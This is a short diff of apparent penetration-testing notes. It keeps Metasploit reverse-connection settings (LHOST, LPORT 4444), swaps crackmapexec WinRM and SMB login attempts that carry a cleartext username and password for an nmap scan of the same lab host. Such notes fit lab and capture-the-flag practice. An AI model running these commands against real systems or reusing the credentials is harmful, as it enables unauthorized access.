@@ -31,8 +31,8 @@ set LHOST 192.168.1.137
 set LPORT 4444
 run
 
-crackmapexec winrm 192.168.1.84 -u rsilva -p asd123$$$ --verbose
-crackmapexec smb 192.168.1.84 -u rsilva -p asd123$$$ --verbose
+nmap -Pn -p 445,5985 192.168.1.84
+
 
 
 
